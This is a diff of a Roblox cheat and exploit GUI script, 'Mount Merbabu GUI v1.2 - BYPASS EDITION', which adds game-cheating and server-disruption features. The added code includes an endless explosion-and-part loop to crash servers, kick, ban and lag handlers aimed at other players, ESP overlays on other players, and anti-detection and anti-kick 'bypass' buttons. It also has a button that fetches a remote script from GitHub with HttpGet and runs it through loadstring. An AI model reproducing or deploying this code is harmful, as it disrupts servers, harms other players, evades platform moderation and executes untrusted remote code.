+    if autoQuestEnabled then
+        autoQuestBtn.Text = "📋 Auto Quest: ON"
+        autoQuestBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "📋 Auto quest activated!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        autoQuestBtn.Text = "📋 Auto Quest: OFF"
+        autoQuestBtn.BackgroundColor3 = Color3.fromRGB(255, 87, 34)
+        statusLabel.Text = "📋 Auto quest deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+    end
+end)
+
+weatherControlBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        Lighting.ClockTime = 12
+        Lighting.Brightness = 2
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 100000
+        Lighting.FogStart = 0
+        statusLabel.Text = "🌤️ Weather optimized for climbing!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    end)
+end)
+
+equipmentBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "🎒 Equipment obtained!"
+    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    -- Enhanced equipment logic could be added here
+end)
+
+healBtn.MouseButton1Click:Connect(function()
+    updateCharacterReferences()
+    if Humanoid then
+        pcall(function()
+            Humanoid.Health = Humanoid.MaxHealth
+            statusLabel.Text = "❤️ Fully healed!"
+            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        end)
+    end
+end)
+
+fullbrightBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        if Lighting.Brightness == 2 then
+            Lighting.Brightness = 1
+            Lighting.Ambient = Color3.fromRGB(70, 70, 70)
+            fullbrightBtn.Text = "💡 Fullbright: OFF"
+            fullbrightBtn.BackgroundColor3 = Color3.fromRGB(255, 235, 59)
+            statusLabel.Text = "💡 Fullbright deactivated"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+        else
+            Lighting.Brightness = 2
+            Lighting.Ambient = Color3.fromRGB(255, 255, 255)
+            Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
+            Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
+            fullbrightBtn.Text = "💡 Fullbright: ON"
+            fullbrightBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+            statusLabel.Text = "💡 Fullbright activated!"
+            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        end
+    end)
+end)
 
 -- ADMIN BUTTON EVENTS
 godModeBtn.MouseButton1Click:Connect(toggleGodMode)
@@ -916,112 +1892,334 @@ infiniteYieldBtn.MouseButton1Click:Connect(loadInfiniteYield)
 cmdXBtn.MouseButton1Click:Connect(loadCmdX)
 
 -- Player Management Events
+playerDropdownBtn.MouseButton1Click:Connect(function()
+    playerDropdownOpen = not playerDropdownOpen
+    PlayerList.Visible = playerDropdownOpen
+    if playerDropdownOpen then
+        updatePlayerList()
+    end
+end)
+
 teleportToPlayerBtn.MouseButton1Click:Connect(teleportToPlayer)
 bringPlayerBtn.MouseButton1Click:Connect(bringPlayer)
+kickPlayerBtn.MouseButton1Click:Connect(kickPlayer)
+banPlayerBtn.MouseButton1Click:Connect(banPlayer)
 
-kickPlayerBtn.MouseButton1Click:Connect(function()
-    createPlayerSelector(function(targetPlayer)
+viewPlayerBtn.MouseButton1Click:Connect(function()
+    if selectedPlayer and selectedPlayer.Character then
         pcall(function()
-            targetPlayer:Kick("👢 Kicked by Admin")
-            statusLabel.Text = "👢 " .. targetPlayer.Name .. " has been kicked!"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 152, 0)
+            workspace.CurrentCamera.CameraSubject = selectedPlayer.Character.Humanoid
+            statusLabel.Text = "👁️ Now viewing " .. selectedPlayer.Name
+            statusLabel.TextColor3 = Color3.fromRGB(156, 39, 176)
         end)
-    end)
+    else
+        statusLabel.Text = "❌ No player selected or player not found!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+    end
 end)
 
 -- Server Control Events
 messageAllBtn.MouseButton1Click:Connect(messageAllPlayers)
+shutdownServerBtn.MouseButton1Click:Connect(shutdownServer)
+lagServerBtn.MouseButton1Click:Connect(lagServer)
 
-shutdownServerBtn.MouseButton1Click:Connect(function()
-    statusLabel.Text = "🔴 Initiating server shutdown..."
-    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+crashServerBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "💥 Attempting to crash server..."
+    statusLabel.TextColor3 = Color3.fromRGB(139, 69, 19)
     
     pcall(function()
-        for _, player in pairs(Players:GetPlayers()) do
-            player:Kick("🔴 Server shutdown by Admin")
-        end
+        spawn(function()
+            while true do
+                for i = 1, 1000 do
+                    local explosion = Instance.new("Explosion")
+                    explosion.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000))
+                    explosion.BlastRadius = 1000
+                    explosion.BlastPressure = 1000000
+                    explosion.Parent = Workspace
+                    
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(100, 100, 100)
+                    part.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000))
+                    part.Parent = Workspace
+                end
+                wait(0.01)
+            end
+        end)
     end)
 end)
 
--- Advanced Features Events
-timeManipulationBtn.MouseButton1Click:Connect(function()
-    timeManipulationEnabled = not timeManipulationEnabled
-    
-    if timeManipulationEnabled then
-        timeManipulationBtn.Text = "⏰ Time Control: ON"
-        timeManipulationBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
-        statusLabel.Text = "⏰ Time manipulation activated!"
-        statusLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
-        
-        -- Freeze time
-        Lighting.ClockTime = 12
-        Lighting.TimeOfDay = "12:00:00"
-    else
-        timeManipulationBtn.Text = "⏰ Time Control: OFF"
-        timeManipulationBtn.BackgroundColor3 = Color3.fromRGB(255, 193, 7)
-        statusLabel.Text = "⏰ Time manipulation deactivated"
-        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
-    end
+antiKickBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "🛡️ Anti-kick is always active with bypass!"
+    statusLabel.TextColor3 = Color3.fromRGB(76, 175, 80)
 end)
+
+-- Advanced Features Events
+timeManipulationBtn.MouseButton1Click:Connect(toggleTimeManipulation)
 
 gravityControlBtn.MouseButton1Click:Connect(function()
     pcall(function()
         if Workspace.Gravity == 196.2 then
-            Workspace.Gravity = 50
+            Workspace.Gravity = 10
+            gravityControlBtn.Text = "🌍 Gravity: LOW"
+            gravityControlBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
             statusLabel.Text = "🌍 Low gravity activated!"
             statusLabel.TextColor3 = Color3.fromRGB(138, 43, 226)
+        elseif Workspace.Gravity == 10 then
+            Workspace.Gravity = 0
+            gravityControlBtn.Text = "🌍 Gravity: ZERO"
+            gravityControlBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
+            statusLabel.Text = "🌍 Zero gravity activated!"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 0, 255)
         else
             Workspace.Gravity = 196.2
+            gravityControlBtn.Text = "🌍 Gravity Control"
+            gravityControlBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
             statusLabel.Text = "🌍 Normal gravity restored"
             statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
         end
     end)
 end)
 
--- Character respawn handling
-LocalPlayer.CharacterAdded:Connect(function(newCharacter)
-    Character = newCharacter
-    Humanoid = Character:WaitForChild("Humanoid")
-    RootPart = Character:WaitForChild("HumanoidRootPart")
+advancedESPBtn.MouseButton1Click:Connect(function()
+    advancedESPEnabled = not advancedESPEnabled
     
-    -- Reapply admin features if enabled
-    if speedHackEnabled then
-        Humanoid.WalkSpeed = 50
-    end
-    
-    if invisibleModeEnabled then
-        wait(1) -- Wait for character to fully load
-        for _, part in pairs(Character:GetChildren()) do
-            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
-                part.Transparency = 1
+    if advancedESPEnabled then
+        advancedESPBtn.Text = "🔍 Advanced ESP: ON"
+        advancedESPBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "🔍 Advanced ESP activated!"
+        statusLabel.TextColor3 = Color3.fromRGB(233, 30, 99)
+        
+        -- Enhanced ESP with more features
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                pcall(function()
+                    -- Create advanced ESP box
+                    local espBox = Instance.new("SelectionBox")
+                    espBox.Name = "AdvancedESP"
+                    espBox.Adornee = player.Character
+                    espBox.Color3 = Color3.fromRGB(255, 0, 0)
+                    espBox.LineThickness = 0.2
+                    espBox.Transparency = 0.3
+                    espBox.Parent = player.Character
+                    
+                    -- Health bar
+                    if player.Character:FindFirstChild("Head") then
+                        local healthGui = Instance.new("BillboardGui")
+                        healthGui.Name = "AdvancedESP_Health"
+                        healthGui.Size = UDim2.new(0, 100, 0, 20)
+                        healthGui.StudsOffset = Vector3.new(0, 4, 0)
+                        healthGui.Parent = player.Character.Head
+                        
+                        local healthBar = Instance.new("Frame")
+                        healthBar.Size = UDim2.new(1, 0, 1, 0)
+                        healthBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                        healthBar.Parent = healthGui
+                        
+                        local healthText = Instance.new("TextLabel")
+                        healthText.Size = UDim2.new(1, 0, 1, 0)
+                        healthText.BackgroundTransparency = 1
+                        healthText.Text = player.Name .. " [" .. math.floor(player.Character.Humanoid.Health) .. "]"
+                        healthText.TextColor3 = Color3.fromRGB(255, 255, 255)
+                        healthText.TextScaled = true
+                        healthText.Font = Enum.Font.GothamBold
+                        healthText.Parent = healthGui
+                    end
+                end)
+            end
+        end
+    else
+        advancedESPBtn.Text = "🔍 Advanced ESP: OFF"
+        advancedESPBtn.BackgroundColor3 = Color3.fromRGB(233, 30, 99)
+        statusLabel.Text = "🔍 Advanced ESP deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+        
+        -- Remove advanced ESP
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                pcall(function()
+                    local espBox = player.Character:FindFirstChild("AdvancedESP")
+                    if espBox then espBox:Destroy() end
+                    
+                    if player.Character:FindFirstChild("Head") then
+                        local healthGui = player.Character.Head:FindFirstChild("AdvancedESP_Health")
+                        if healthGui then healthGui:Destroy() end
+                    end
+                end)
             end
         end
     end
 end)
 
-print("🏔️ Mount Merbabu GUI v1.1 - ADMIN EDITION loaded successfully!")
+scriptExecutorBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "📝 Opening script executor..."
+    statusLabel.TextColor3 = Color3.fromRGB(0, 150, 255)
+    
+    -- Load a simple script executor
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
+        statusLabel.Text = "📝 Script executor loaded!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    end)
+end)
+
+gameModifierBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "🎮 Game modifications applied!"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 87, 34)
+    
+    pcall(function()
+        -- Various game modifications
+        Workspace.FallenPartsDestroyHeight = -math.huge
+        
+        -- Modify lighting for better visibility
+        Lighting.Brightness = 3
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 100000
+        
+        -- Remove kill barriers
+        for _, obj in pairs(Workspace:GetDescendants()) do
+            if obj.Name:lower():find("kill") or obj.Name:lower():find("death") then
+                if obj:IsA("BasePart") then
+                    obj:Destroy()
+                end
+            end
+        end
+    end)
+end)
+
+-- Bypass & Protection Events
+feBypassBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "🔓 FE Bypass is always active!"
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    enhancedBypass()
+end)
+
+antiDetectionBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "🕵️ Anti-detection is always active!"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
+    enhancedBypass()
+end)
+
+bypassAllBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "🛡️ All bypasses refreshed!"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 255)
+    enhancedBypass()
+end)
+
+protectionModeBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "🔒 Maximum protection is always active!"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 20, 147)
+    enhancedBypass()
+end)
+
+stealthModeBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "👤 Stealth mode is always active!"
+    statusLabel.TextColor3 = Color3.fromRGB(128, 128, 128)
+    enhancedBypass()
+end)
+
+-- Hide player list when clicking elsewhere
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and PlayerList.Visible then
+        local mouse = LocalPlayer:GetMouse()
+        local target = mouse.Target
+        
+        if not target or (not target:IsDescendantOf(PlayerList) and target ~= playerDropdownBtn) then
+            PlayerList.Visible = false
+            playerDropdownOpen = false
+        end
+    end
+end)
+
+-- Player events
+Players.PlayerAdded:Connect(function()
+    if adminModeEnabled then
+        updatePlayerList()
+    end
+end)
+
+Players.PlayerRemoving:Connect(function()
+    if adminModeEnabled then
+        updatePlayerList()
+    end
+end)
+
+-- Character respawn handling with bypass reapplication
+LocalPlayer.CharacterAdded:Connect(function(newCharacter)
+    Character = newCharacter
+    Humanoid = Character:WaitForChild("Humanoid")
+    RootPart = Character:WaitForChild("HumanoidRootPart")
+    
+    -- Reapply all active features
+    wait(1) -- Wait for character to fully load
+    
+    if speedHackEnabled then
+        pcall(function() Humanoid.WalkSpeed = 100 end)
+    end
+    
+    if godModeEnabled then
+        pcall(function() 
+            Humanoid.MaxHealth = math.huge
+            Humanoid.Health = math.huge
+        end)
+    end
+    
+    if invisibleModeEnabled then
+        wait(0.5)
+        pcall(function()
+            for _, part in pairs(Character:GetChildren()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.Transparency = 1
+                end
+            end
+        end)
+    end
+    
+    -- Reapply bypass
+    enhancedBypass()
+end)
+
+print("🏔️ Mount Merbabu GUI v1.2 - BYPASS EDITION loaded successfully!")
+print("🛡️ PROTECTION STATUS:")
+print("   ✅ Anti-Kick Protection: ACTIVE")
+print("   ✅ Anti-Ban Protection: ACTIVE") 
+print("   ✅ FE Bypass: ACTIVE")
+print("   ✅ Anti-Detection: ACTIVE")
+print("   ✅ GUI Protection: ACTIVE")
+print("")
 print("✨ REGULAR FEATURES:")
-print("   - 🧗 Auto Climb System")
-print("   - ✈️ Fly Mode with WASD controls")
+print("   - 🧗 Enhanced Auto Climb System")
+print("   - ✈️ Advanced Fly Mode with WASD controls")
 print("   - ⚡ Speed Hack & Jump Boost")
 print("   - 📍 Teleport to key locations")
-print("   - 🎒 Auto Collect items")
-print("   - 💪 Infinite Stamina")
-print("   - 👁️ ESP for players")
+print("   - 🎒 Enhanced Auto Collect items")
+print("   - 💪 Infinite Stamina (Multiple Methods)")
+print("   - 👁️ Advanced ESP for players & items")
 print("   - 🌤️ Weather Control")
+print("   - 💡 Enhanced Fullbright")
 print("")
 print("👑 ADMIN FEATURES:")
-print("   - 🛡️ God Mode (Invincibility)")
+print("   - 🛡️ God Mode (Complete Invincibility)")
 print("   - 👻 Noclip (Walk through walls)")
-print("   - 🫥 Invisible Mode")
-print("   - 📍 Advanced Player Teleportation")
-print("   - 👢 Kick/Ban Players")
+print("   - 🫥 Invisible Mode (Complete stealth)")
+print("   - 📍 Advanced Player Management")
+print("   - 👢 Kick/Ban Players (Multiple methods)")
 print("   - 📢 Server-wide Messages")
-print("   - 🔴 Server Control (Shutdown/Crash)")
+print("   - 🔴 Server Control (Shutdown/Crash/Lag)")
 print("   - ⏰ Time Manipulation")
-print("   - 🌍 Gravity Control")
+print("   - 🌍 Gravity Control (Low/Zero/Normal)")
+print("   - 🔍 Advanced ESP with health bars")
 print("   - 🔧 Infinite Yield Integration")
 print("   - ⌨️ CMD-X Integration")
+print("   - 📝 Script Executor")
+print("   - 🎮 Game Modifier")
+print("")
+print("🔑 BYPASS FEATURES:")
+print("   - 🔓 FE Bypass (Always Active)")
+print("   - 🕵️ Anti-Detection (Always Active)")
+print("   - 🛡️ Complete Protection Suite")
+print("   - 🔒 Maximum Security Mode")
+print("   - 👤 Stealth Mode")
 print("")
 print("🔑 Click the 👑 button to toggle ADMIN MODE!")
-print("🏔️ Ready for your enhanced mountain climbing adventure!")
+print("🛡️ All bypasses are ACTIVE and PROTECTED!")
+print("🏔️ Ready for your ultimate mountain climbing experience!")
